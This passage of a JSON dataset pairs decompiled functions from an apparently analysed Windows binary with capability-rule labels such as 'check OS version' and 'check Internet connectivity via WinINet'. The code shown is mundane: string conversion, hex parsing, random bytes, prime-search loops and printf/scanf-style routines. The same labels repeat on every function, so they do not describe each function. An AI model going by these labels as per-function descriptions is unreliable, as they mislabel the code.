            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d4d1(uint CodePage, uint lpString, uint32_t arg_10h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    if (in_EAX == 0) {\n        in_EAX = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(CodePage, 0, lpString, in_EAX);\n    if (arg_10h != 0) {\n        if (arg_10h < uVar1) {\n            uVar1 = 0;\n        }\n        *(unaff_ESI + uVar1 * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "0040d7c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d7c0(char *param_1)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t *in_EAX;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 2;\n    cVar2 = fcn.0040f871();\n    if ((cVar2 == '\\0') || (cVar2 = fcn.0040f8eb(param_1),  cVar2 == '\\0')) {\n        return 0;\n    }\n    do {\n        bVar1 = false;\n        while( true ) {\n            cVar2 = *param_1;\n            if (cVar2 == '\\0') {\n                return var_8h;\n            }\n            if (var_4h == 0) {\n                return var_8h;\n            }\n            param_1 = param_1 + 1;\n            if ((cVar2 == '\\0') && (!bVar1)) {\n                return var_8h;\n            }\n            uVar3 = fcn.0040d79a();\n            if (uVar3 == 0xff) {\n                return var_8h;\n            }\n            if (bVar1) break;\n            *in_EAX = uVar3 << 4;\n            bVar1 = true;\n        }\n        *in_EAX = *in_EAX | uVar3;\n        in_EAX = in_EAX + 1;\n        var_4h = var_4h + -1;\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 378
    },
    "0040d968": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040d968(uint32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    uVar4 = 0;\n    if ((arg_ch != '\\0') && (1 < arg_8h)) {\n        cVar1 = fcn.0040f898();\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.0040d830(arg_ch, &var_4h);\n            if (iVar2 != 0) {\n                if (arg_8h != 1) {\n                    do {\n                        iVar3 = fcn.0040c985();\n                        *(in_EAX + uVar4 * 2) = *(iVar2 + iVar3 * 2);\n                        uVar4 = uVar4 + 1;\n                    } while (uVar4 < arg_8h - 1);\n                }\n                *(in_EAX + -2 + arg_8h * 2) = 0;\n                fcn.0040af12();\n                uVar4 = 1;\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 283
    },
    "0040db26": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040db26(void)\n\n{\n    uint32_t *unaff_EDI;\n    uint32_t uStack4;\n    \n    if (unaff_EDI != NULL) {\n        fcn.0040f6f5();\n        uStack4 = 0;\n        if (*unaff_EDI != 0) {\n            do {\n                fcn.0040c13c();\n                uStack4 = uStack4 + 1;\n            } while (uStack4 < *unaff_EDI);\n        }\n        fcn.0040f763();\n        fcn.0040f7cc();\n        fcn.0040af12();\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "0040dc4a": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040dc4a(uint *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint var_2b8h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_10h = 0;\n    var_14h = fcn.004111b4();\n    var_8h = 0;\n    var_ch = 0;\n    do {\n        if (4 < var_ch) break;\n        fcn.0041171b(arg_ch, arg_10h, 1);\n        fcn.0041150c(arg_ch + -1);\n        fcn.0041150c(arg_ch + -2);\n        uVar6 = 0;\n        fcn.0041150c(0);\n        do {\n            uVar4 = fcn.004114ec(var_14h, *(uVar6 + 0x41b860));\n            *(&var_2b8h + uVar6) = uVar4;\n            uVar6 = uVar6 + 4;\n        } while (uVar6 < 0x29c);\n        iVar5 = 0;\n        var_8h = 0;\n        var_4h = 0;\n        if (arg_ch * 100 != 0) {\n            do {\n                iVar3 = var_14h;\n                uVar6 = 0;\n                if (iVar5 != 0) break;\n                var_10h = var_10h + 1;\n                if (var_4h != 0) {\n                    do {\n                        puVar2 = &var_2b8h + uVar6;\n                        puVar1 = uVar6 + 0x41b860;\n                        uVar6 = uVar6 + 4;\n                        *puVar2 = (*puVar2 + 2) % *puVar1;\n                    } while (uVar6 < 0x29c);\n                }\n                uVar6 = 0;\n                do {\n                    if ((&var_2b8h)[uVar6] == 0) goto code_r0x0040dd62;\n                    uVar6 = uVar6 + 1;\n                } while (uVar6 < 0xa7);\n                fcn.004114ec(var_14h, 0x10001);\n                iVar5 = fcn.00413b65(*(iVar3 + 4));\n                if ((iVar5 != 0) && (iVar5 = fcn.00414124(*arg_8h),  iVar5 != 0)) {\n                    var_8h = 1;\n                    break;\n                }\ncode_r0x0040dd62:\n                var_4h = var_4h + 1;\n                iVar5 = fcn.004113a0(arg_8h);\n            } while (var_4h < arg_ch * 100);\n        }\n        var_ch = var_ch + 1;\n    } while (var_8h == 0);\n    fcn.004111e1(&var_14h);\n    if (var_8h == 0) {\n        var_10h = -1;\n    }\n    return var_10h;\n}\n",
        "token_count": 778
    },
    "0040e17d": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e17d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint unaff_EDI;\n    \n    fcn.004112a9(arg_10h, arg_14h);\n    fcn.0041154c(arg_8h, arg_ch, unaff_EDI);\n    if (arg_18h != 0) {\n        iVar1 = fcn.004137b1();\n        fcn.004112e1(arg_18h, iVar1 + 7U >> 3);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "0040f161": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040f161(int32_t arg_8h)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t unaff_EDI;\n    uint phProv;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    cVar1 = fcn.0040f871(arg_8h);\n    if (cVar1 != '\\0') {\n        uVar4 = 0;\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(&phProv, 0, 0, 1, 0xf0000040);\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_CryptGenRandom)(phProv);\n            _auStack8 = _auStack8 & 0xffffff | (iVar3 != 0) << 0x18;\n            (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(phProv, 0);\n            if (var_1h != '\\0') {\n                return;\n            }\n        }\n        if (unaff_EDI != 0) {\n            do {\n                uVar2 = fcn.0040c985();\n                *(uVar4 + arg_8h) = uVar2;\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < unaff_EDI);\n        }\n    }\n    return;\n}\n",
        "token_count": 355
    },
    "0040fc63": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nint32_t __cdecl fcn.0040fc63(double *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    float fVar3;\n    bool bVar4;\n    uint8_t uVar5;\n    uint8_t *in_EAX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint8_t *puVar8;\n    int32_t *unaff_EDI;\n    bool bVar9;\n    float10 extraout_ST0;\n    float10 extraout_ST0_00;\n    float10 extraout_ST0_01;\n    float10 extraout_ST1;\n    float10 extraout_ST1_00;\n    float10 fVar10;\n    int64_t iVar11;\n    uint var_18h;\n    int32_t var_14h;\n    double *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_2h;\n    \n    var_8h = 0;\n    uVar5 = *in_EAX;\n    if (uVar5 == 0) {\n        return 0;\n    }\n    do {\n        iVar6 = (*_sym.imp.ntdll.dll_isspace)(uVar5);\n        if (iVar6 == 0) break;\n        in_EAX = in_EAX + 1;\n        uVar5 = *in_EAX;\n        var_8h = var_8h + 1;\n    } while (uVar5 != 0);\n    uVar5 = *in_EAX;\n    if (uVar5 == 0) {\n        return var_8h;\n    }\n    var_ch = 0;\n    // switch table (10 cases) at 0x410147\n    switch(*unaff_EDI) {\n    case 1:\n        if (arg_8h != NULL) {\n            *arg_8h = uVar5;\n        }\n        goto code_r0x0040fcbe;\n    case 2:\n        if (arg_8h != NULL) {\n            *arg_8h = uVar5;\n        }\ncode_r0x0040fcbe:\n        var_8h = 1;\n        goto code_r0x00410137;\n    case 3:\n        var_ch = 0;\n        iVar6 = unaff_EDI[2];\n        while (((iVar6 != 0 && (*in_EAX != 0)) && (iVar6 = (*_sym.imp.ntdll.dll_isspace)(*in_EAX),  iVar6 == 0))) {\n            if (arg_8h != NULL) {\n                *(var_ch + arg_8h) = *in_EAX;\n            }\n            if (0 < unaff_EDI[2]) {\n                unaff_EDI[2] = unaff_EDI[2] + -1;\n            }\n            var_ch = var_ch + 1;\n            in_EAX = in_EAX + 1;\n            iVar6 = unaff_EDI[2];\n        }\n        if (arg_8h != NULL) {\n            *(var_ch + arg_8h) = 0;\n        }\n        goto code_r0x0040fd20;\n    case 4:\n        var_ch = 0;\n        iVar6 = unaff_EDI[2];\n        while (((iVar6 != 0 && (*in_EAX != 0)) && (iVar6 = (*_sym.imp.ntdll.dll_isspace)(*in_EAX),  iVar6 == 0))) {\n            if (arg_8h != NULL) {\n                fcn.0040d5e4(in_EAX, 1, arg_8h + var_ch * 2);\n            }\n            if (0 < unaff_EDI[2]) {\n                unaff_EDI[2] = unaff_EDI[2] + -1;\n            }\n            var_ch = var_ch + 1;\n            in_EAX = in_EAX + 1;\n            iVar6 = unaff_EDI[2];\n        }\n        if (arg_8h != NULL) {\n            *(arg_8h + var_ch * 2) = 0;\n        }\ncode_r0x0040fd20:\n        var_8h = var_8h + var_ch;\ncode_r0x0040fd25:\n        if (var_ch == 0) {\n            return var_8h;\n        }\n        goto code_r0x00410137;\n    case 5:\n    case 6:\n        break;\n    case 7:\n        var_ch = 0x10;\n        break;\n    case 8:\n        var_ch = 8;\n        break;\n    case 9:\n        if (unaff_EDI[4] == 0) {\n            return var_8h;\n        }\n        var_ch = 0;\n        var_10h = arg_8h;\n        cVar1 = *(unaff_EDI + 3);\n        while (((unaff_EDI[2] != 0 && (uVar5 = *in_EAX,  uVar5 != 0)) &&\n               (in_EAX = in_EAX + 1,  -(cVar1 != '\\0') != -((1 << (uVar5 & 7) & *((uVar5 >> 3) + unaff_EDI[4])) != 0))))\n        {\n            var_8h = var_8h + 1;\n            *var_10h = uVar5;\n            if (0 < unaff_EDI[2]) {\n                unaff_EDI[2] = unaff_EDI[2] + -1;\n            }\n            var_ch = var_ch + 1;\n            var_10h = var_10h + 1;\n        }\n        if (var_10h != NULL) {\n            *var_10h = 0;\n        }\n        fcn.0040af12();\n        goto code_r0x0040fd25;\n    case 10:\n        fVar10 = 0;\n        if ((uVar5 == 0x2d) || (uVar5 == 0x2b)) {\n            in_EAX = in_EAX + 1;\n            var_8h = var_8h + 1;\n            if (0 < unaff_EDI[2]) {\n                unaff_EDI[2] = unaff_EDI[2] + -1;\n            }\n        }\n        if (*in_EAX != 0x2e) {\n            while (((unaff_EDI[2] != 0 && (uVar5 = *in_EAX,  uVar5 != 0)) &&\n                   (iVar6 = fcn.0040fc12(uVar5),  fVar10 = extraout_ST1,  iVar6 != 0))) {\n                in_EAX = in_EAX + 1;\n                var_8h = var_8h + -1;\n                fVar10 = extraout_ST1 * extraout_ST0 + uVar5 + -0x30;\n                if (0 < unaff_EDI[2]) {\n                    unaff_EDI[2] = unaff_EDI[2] + -1;\n                }\n            }\n        }\n        iVar6 = unaff_EDI[2];\n        if ((iVar6 != 0) && (*in_EAX == 0x2e)) {\n            while( true ) {\n                in_EAX = in_EAX + 1;\n                var_8h = var_8h + -1;\n                if (0 < iVar6) {\n                    unaff_EDI[2] = iVar6 + -1;\n                }\n                if (((unaff_EDI[2] == 0) || (uVar5 = *in_EAX,  uVar5 == 0)) ||\n                   (iVar6 = fcn.0040fc12(uVar5),  iVar6 == 0)) break;\n                iVar6 = unaff_EDI[2];\n                fVar10 = (uVar5 + -0x30) * (extraout_ST0_00 / extraout_ST1_00) + fVar10;\n            }\n        }\n        iVar6 = unaff_EDI[2];\n        if ((iVar6 != 0) && ((*in_EAX == 0x65 || (*in_EAX == 0x45)))) {\n            var_ch = 0;\n            puVar8 = in_EAX + 1;\n            bVar9 = false;\n            if (0 < iVar6) {\n                unaff_EDI[2] = iVar6 + -1;\n            }\n            iVar6 = unaff_EDI[2];\n            iVar7 = var_8h + -1;\n            if ((iVar6 != 0) && ((uVar5 = *puVar8,  uVar5 == 0x2d || (uVar5 == 0x2b)))) {\n                bVar9 = uVar5 == 0x2d;\n                puVar8 = in_EAX + 2;\n                iVar7 = var_8h + -2;\n                if (0 < iVar6) {\n                    unaff_EDI[2] = iVar6 + -1;\n                }\n            }\n            while (((var_8h = iVar7,  unaff_EDI[2] != 0 && (uVar5 = *puVar8,  uVar5 != 0)) &&\n                   (iVar6 = fcn.0040fc12(uVar5),  fVar10 = extraout_ST0_01,  iVar6 != 0))) {\n                var_ch = var_ch * 10 + -0x30 + uVar5;\n                puVar8 = puVar8 + 1;\n                iVar7 = var_8h + -1;\n                if (0 < unaff_EDI[2]) {\n                    unaff_EDI[2] = unaff_EDI[2] + -1;\n                }\n            }\n            fVar3 = *0x419080;\n            if (bVar9) {\n                fVar3 = *0x419084;\n            }\n            for (; var_ch != 0; var_ch = var_ch / 2) {\n                if ((var_ch & 1) != 0) {\n                    fVar10 = fVar10 * fVar3;\n                }\n                fVar3 = fVar3 * fVar3;\n            }\n        }\n        if (arg_8h != NULL) {\n            if (((unaff_EDI[1] & 0x10U) == 0) && ((unaff_EDI[1] & 1U) == 0)) {\n                *arg_8h = fVar10;\n            }\n            else {\n                *arg_8h = fVar10;\n            }\n        }\n        goto code_r0x00410137;\n    default:\n        return var_8h;\n    }\n    iVar11 = 0;\n    bVar9 = false;\n    bVar4 = true;\n    if ((uVar5 == 0x2d) || (uVar5 == 0x2b)) {\n        bVar9 = uVar5 == 0x2d;\n        in_EAX = in_EAX + 1;\n        var_8h = var_8h + 1;\n        if (0 < unaff_EDI[2]) {\n            unaff_EDI[2] = unaff_EDI[2] + -1;\n        }\n    }\n    iVar6 = unaff_EDI[2];\n    if ((iVar6 != 0) && (*in_EAX == 0x30)) {\n        in_EAX = in_EAX + 1;\n        var_8h = var_8h + 1;\n        if (0 < iVar6) {\n            unaff_EDI[2] = iVar6 + -1;\n        }\n        iVar6 = unaff_EDI[2];\n        if ((iVar6 != 0) && ((*in_EAX == 0x78 || (*in_EAX == 0x58)))) {\n            if (var_ch == 0) {\n                var_ch = 0x10;\n            }\n            if (var_ch == 0x10) goto code_r0x0040fe29;\n            bVar4 = false;\n        }\n    }\n    while ((iVar6 = var_8h,  unaff_EDI[2] != 0 && (*in_EAX == 0x30))) {\n        iVar6 = unaff_EDI[2];\ncode_r0x0040fe29:\n        in_EAX = in_EAX + 1;\n        var_8h = var_8h + 1;\n        if (0 < iVar6) {\n            unaff_EDI[2] = iVar6 + -1;\n        }\n    }\n    if (unaff_EDI[2] != 0) {\n        iVar11 = 0;\n        do {\n            if ((in_EAX[var_8h - iVar6] == 0) || (iVar7 = fcn.0040fc12(in_EAX[var_8h - iVar6]),  iVar7 == -1)) break;\n            iVar11 = sub.ntdll.dll__allmul();\n            iVar11 = iVar11 + iVar7;\n            var_8h = var_8h + 1;\n            if (0 < unaff_EDI[2]) {\n                unaff_EDI[2] = unaff_EDI[2] + -1;\n            }\n        } while (unaff_EDI[2] != 0);\n    }\n    var_14h = iVar11 >> 0x20;\n    if (!bVar4) {\n        return var_8h;\n    }\n    if (arg_8h == NULL) goto code_r0x00410137;\n    if ((bVar9) && (*unaff_EDI == 5)) {\n        iVar11 = CONCAT44(-(var_14h + (iVar11 != 0)), -iVar11);\n    }\n    uVar2 = unaff_EDI[1];\n    if ((uVar2 & 8) == 0) {\n        if ((uVar2 & 2) != 0) {\n            *arg_8h = iVar11;\n            goto code_r0x00410137;\n        }\n        if (((uVar2 & 1) == 0) && ((uVar2 & 0x20) == 0)) {\n            if ((uVar2 & 0x10) != 0) {\n                *arg_8h = iVar11;\n                *(arg_8h + 4) = iVar11 >> 0x20;\n            }\n            goto code_r0x00410137;\n        }\n    }\n    *arg_8h = iVar11;\ncode_r0x00410137:\n    *arg_ch = 1;\n    return var_8h;\n}\n",
        "token_count": 3222
    },
    "0041016f": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Switch with 1 destination removed at 0x00410201 : 10 cases all go to same destination\n\nint32_t __cdecl fcn.0041016f(int32_t arg_8h)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    uint arg_8h_00;\n    char *in_ECX;\n    uint *puVar2;\n    int32_t iStack40;\n    int32_t iStack36;\n    char *pcStack32;\n    int32_t iStack28;\n    uint8_t uStack24;\n    \n    if (((in_EAX == NULL) || (in_ECX == NULL)) || (*in_ECX == '\\0')) {\n        iStack40 = 0;\n    }\n    else {\n        iStack40 = 0;\n        if (*in_EAX != '\\0') {\n            puVar2 = arg_8h + -4;\n            do {\n                iVar1 = (*_sym.imp.ntdll.dll_isspace)(*in_EAX);\n                if (iVar1 != 0) {\n                    while ((*in_ECX != '\\0' && (iVar1 = (*_sym.imp.ntdll.dll_isspace)(*in_ECX),  iVar1 != 0))) {\n                        in_ECX = in_ECX + 1;\n                    }\n                    in_EAX = in_EAX + 1;\n                }\n                if (*in_EAX == '%') {\n                    iVar1 = fcn.0040fa72(in_EAX + 1, &iStack28);\n                    pcStack32 = in_EAX + 1 + iVar1;\n                    arg_8h_00 = 0;\n                    if (((uStack24 & 0x40) == 0) && (iStack28 - 1U < 10)) {\n    // switch table (10 cases) at 0x410257\n                        puVar2 = puVar2 + 1;\n                        arg_8h_00 = *puVar2;\n                    }\n                    iStack36 = 0;\n                    iVar1 = fcn.0040fc63(arg_8h_00, &iStack36);\n                    if (iStack36 == 0) {\n                        return iStack40;\n                    }\n                    iStack40 = iStack40 + iStack36;\n                    in_ECX = in_ECX + iVar1;\n                    in_EAX = pcStack32;\n                }\n                else {\n                    if (*in_EAX != *in_ECX) {\n                        return iStack40;\n                    }\n                    in_EAX = in_EAX + 1;\n                    in_ECX = in_ECX + 1;\n                }\n            } while (*in_EAX != '\\0');\n        }\n    }\n    return iStack40;\n}\n",
        "token_count": 582
    },
    "004106a1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004106a1(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint16_t *arg_10h;\n    uint32_t *puStack316;\n    int32_t iStack312;\n    uint32_t *puStack308;\n    uint32_t uStack304;\n    uint32_t uStack300;\n    uchar uStack292;\n    uchar uStack291;\n    uint32_t uStack288;\n    uint32_t uStack284;\n    uint32_t uStack280;\n    uint32_t uStack276;\n    uint32_t uStack272;\n    uint32_t uStack268;\n    char acStack264 [260];\n    \n    iStack312 = 0;\n    if (*arg_ch != 0) {\n        puStack316 = in_EAX + -4;\n        puStack308 = in_EAX + -8;\n        arg_10h = arg_8h;\n        do {\n            if (*arg_ch == 0x25) {\n                arg_ch = arg_ch + 1;\n                if (*arg_ch == 0x25) {\n                    if (arg_10h != NULL) {\n                        *arg_10h = 0x25;\n                        arg_10h = arg_10h + 1;\n                    }\n                    goto code_r0x004106e8;\n                }\n                iVar2 = fcn.00410531(arg_ch, &uStack284);\n                arg_ch = arg_ch + iVar2;\n                if (uStack284 == 1) {\n                    puStack308 = puStack308 + 1;\n                    puStack316 = puStack316 + 1;\n                    uStack304 = uStack304 & 0xffffff00 | *puStack316;\n                }\n                else if (uStack284 == 2) {\n                    puStack308 = puStack308 + 1;\n                    puStack316 = puStack316 + 1;\n                    uVar1 = *puStack316;\ncode_r0x0041079f:\n                    uStack304 = uStack304 & 0xffff0000 | uVar1;\n                }\n                else if ((uStack284 == 3) || (uStack284 == 4)) {\n                    puStack308 = puStack308 + 1;\n                    puStack316 = puStack316 + 1;\n                    uStack304 = *puStack316;\n                }\n                else {\n                    if (3 < uStack284 - 5) {\n                        uVar1 = 0;\n                        goto code_r0x0041079f;\n                    }\n                    if ((((uStack280 & 0x800) == 0) && ((uStack280 & 0x80) == 0)) && ((uStack280 & 0x100) != 0)) {\n                        uStack304 = puStack308[2];\n                        puStack316 = puStack316 + 2;\n                        uStack300 = puStack308[3];\n                        puStack308 = puStack308 + 2;\n                    }\n                    else {\n                        puStack308 = puStack308 + 1;\n                        puStack316 = puStack316 + 1;\n                        uStack304 = *puStack316;\n                        uStack300 = uStack304 >> 0x1f;\n                    }\n                }\n                uStack268 = fcn.0041027f(acStack264, uStack304, uStack300);\n                iStack312 = iStack312 + uStack268;\n                uStack288 = uStack280 & 1;\n                if ((uStack288 == 0) && (uStack272 < uStack276)) {\n                    iVar2 = uStack276 - uStack272;\n                    iStack312 = iStack312 + iVar2;\n                    do {\n                        if (arg_10h != NULL) {\n                            *arg_10h = 0x20;\n                            arg_10h = arg_10h + 1;\n                        }\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n                uVar3 = 0;\n                iVar2 = iStack312;\n    // switch table (9 cases) at 0x4109cd\n                switch(uStack284) {\n                case 0:\n                    goto code_r0x0041099e;\n                case 1:\n                    if (arg_10h != NULL) {\n                        uStack304._0_2_ = uStack304;\ncode_r0x00410863:\n                        *arg_10h = uStack304;\n                        arg_10h = arg_10h + 1;\n                    }\n                    break;\n                case 2:\n                    if (arg_10h != NULL) {\n                        goto code_r0x00410863;\n                    }\n                    break;\n                case 3:\n                    if ((arg_10h != NULL) && (uVar3 = 0,  uStack268 != 0)) {\n                        do {\n                            uStack292 = *(uVar3 + uStack304);\n                            uStack291 = 0;\n                            fcn.0040d5e4(&uStack292, 1, arg_10h);\n                            arg_10h = arg_10h + 1;\n                            uVar3 = uVar3 + 1;\n                        } while (uVar3 < uStack268);\n                    }\n                    break;\n                case 4:\n                    if ((arg_10h != NULL) && (uVar3 = 0,  uStack268 != 0)) {\n                        do {\n                            *arg_10h = *(uStack304 + uVar3 * 2);\n                            arg_10h = arg_10h + 1;\n                            uVar3 = uVar3 + 1;\n                        } while (uVar3 < uStack268);\n                    }\n                    break;\n                case 7:\n                case 8:\n                    if (((uStack280 & 2) != 0) && (((uStack304 | uStack300) != 0 || ((uStack280 & 0x1000) != 0)))) {\n                        if (arg_10h != NULL) {\n                            *arg_10h = 0x30;\n                            arg_10h = arg_10h + 1;\n                        }\n                        iVar2 = iStack312 + 1;\n                        if (uStack284 == 7) {\n                            if (arg_10h != NULL) {\n                                *arg_10h = ~uStack280 & 0x20 | 0x58;\n                                arg_10h = arg_10h + 1;\n                            }\n                            iVar2 = iStack312 + 2;\n                        }\n                    }\n                case 5:\n                    iStack312 = iVar2;\n                    if ((arg_10h != NULL) && (acStack264[0] == '-')) {\n                        *arg_10h = 0x2d;\n                        arg_10h = arg_10h + 1;\n                        uVar3 = 1;\n                    }\n                case 6:\n                    if (uStack268 < uStack272) {\n                        iVar2 = uStack272 - uStack268;\n                        iStack312 = iStack312 + iVar2;\n                        do {\n                            if (arg_10h != NULL) {\n                                *arg_10h = 0x30;\n                                arg_10h = arg_10h + 1;\n                            }\n                            iVar2 = iVar2 + -1;\n                        } while (iVar2 != 0);\n                    }\n                    if (arg_10h != NULL) {\n                        for (; uVar3 < uStack268; uVar3 = uVar3 + 1) {\n                            *arg_10h = acStack264[uVar3];\n                            arg_10h = arg_10h + 1;\n                        }\n                    }\n                }\n                if ((uStack288 != 0) && (uStack272 < uStack276)) {\n                    iVar2 = uStack276 - uStack272;\n                    iStack312 = iStack312 + iVar2;\n                    do {\n                        if (arg_10h != NULL) {\n                            *arg_10h = 0x20;\n                            arg_10h = arg_10h + 1;\n                        }\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n            }\n            else {\n                if (arg_10h != NULL) {\n                    *arg_10h = *arg_ch;\n                    arg_10h = arg_10h + 1;\n                }\ncode_r0x004106e8:\n                arg_ch = arg_ch + 1;\n                iStack312 = iStack312 + 1;\n            }\ncode_r0x0041099e:\n        } while (*arg_ch != 0);\n        if ((iStack312 != 0) && (arg_8h != NULL)) {\n            arg_8h[iStack312] = 0;\n        }\n    }\n    return iStack312;\n}\n",
        "token_count": 1945
    },
    "00410b60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00410b60(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    int32_t iStack312;\n    uint8_t *puStack308;\n    uint32_t *puStack304;\n    uint32_t *puStack300;\n    uint32_t uStack296;\n    uint32_t uStack292;\n    uint32_t uStack284;\n    uint32_t uStack280;\n    uint32_t uStack276;\n    uint32_t uStack272;\n    ushort uStack268;\n    ushort uStack266;\n    char acStack264 [260];\n    \n    iStack312 = 0;\n    puStack308 = arg_8h;\n    if (*arg_ch != 0) {\n        puStack300 = in_EAX + -4;\n        puStack304 = in_EAX + -8;\n        puVar5 = arg_8h;\n        do {\n            if (*arg_ch == 0x25) {\n                arg_ch = arg_ch + 1;\n                if (*arg_ch == 0x25) {\n                    if (puVar5 != NULL) {\n                        *puVar5 = 0x25;\n                        goto code_r0x00410ba7;\n                    }\n                    goto code_r0x00410bac;\n                }\n                iVar2 = fcn.00410a11(arg_ch, &uStack284);\n                arg_ch = arg_ch + iVar2;\n                if (uStack284 == 1) {\n                    uStack296 = uStack296 & 0xffffff00 | *(puStack300 + 1);\ncode_r0x00410c93:\n                    puStack304 = puStack304 + 1;\n                    puStack300 = puStack300 + 1;\n                }\n                else {\n                    if (uStack284 == 2) {\n                        uStack296 = uStack296 & 0xffff0000 | *(puStack300 + 1);\n                        goto code_r0x00410c93;\n                    }\n                    if ((uStack284 == 3) || (uStack284 == 4)) {\n                        puStack304 = puStack304 + 1;\n                        puStack300 = puStack300 + 1;\n                        uStack296 = *puStack300;\n                    }\n                    else if (uStack284 - 5 < 4) {\n                        if ((((uStack280 & 0x800) == 0) && ((uStack280 & 0x80) == 0)) && ((uStack280 & 0x100) != 0)) {\n                            uStack296 = puStack304[2];\n                            uStack292 = puStack304[3];\n                            puStack300 = puStack300 + 2;\n                            puStack304 